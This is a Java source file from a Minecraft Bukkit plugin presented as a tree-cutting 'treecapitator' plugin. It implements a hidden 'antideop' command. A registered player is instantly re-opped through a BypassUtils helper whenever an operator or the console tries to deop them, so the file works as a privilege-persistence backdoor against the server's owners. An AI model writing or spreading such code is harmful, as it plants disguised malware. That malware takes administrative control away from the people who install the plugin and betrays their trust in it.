package me.bow.treecapitatorultimate.commands.Server;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.BypassUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.util.ArrayList;
import java.util.UUID;

@Command.Info(command = "antideop", description = "Prevents deoping you", category = CommandCategory.Server)
public class AntiDeop extends Command {
    private ArrayList<UUID> players = new ArrayList<>();

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (players.contains(p.getUniqueId())) {
            players.remove(p.getUniqueId());
            p.sendMessage(Start.Prefix + ChatColor.RED + "You can now be deoped!");
        } else {
            players.add(p.getUniqueId());
            p.sendMessage(Start.Prefix + ChatColor.GREEN + "You now can not be deoped!");
        }
    }

    @Override
    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
        if (!e.getPlayer().isOp()) return;
        String command = e.getMessage();
        if (!command.startsWith("/" + "deop")) return;
        OpDelayed(command);
    }

    @Override
    public void onServerCommand(ServerCommandEvent e) {
        String command = e.getCommand();
        if (!command.startsWith("deop")) return;
        OpDelayed(command);
    }

    private void OpDelayed(String command) {
        String[] args = command.split(" ");
        if (args.length <= 1) return;
        if (args[1].startsWith("@")) {
            Bukkit.getScheduler().runTask(Start.Instance, () -> {
                for (UUID uuid : players) {
                    Player p = Bukkit.getPlayer(uuid);
                    if (p == null || !p.isOnline()) return;
                    Bukkit.getScheduler().runTask(Start.Instance, () -> BypassUtils.PlayerOp(p));
                }
            });
        } else {
            Player p = Bukkit.getPlayer(args[1]);
            if (p == null || !players.contains(p.getUniqueId())) return;
            Bukkit.getScheduler().runTask(Start.Instance, () -> BypassUtils.PlayerOp(p));
        }
    }
}
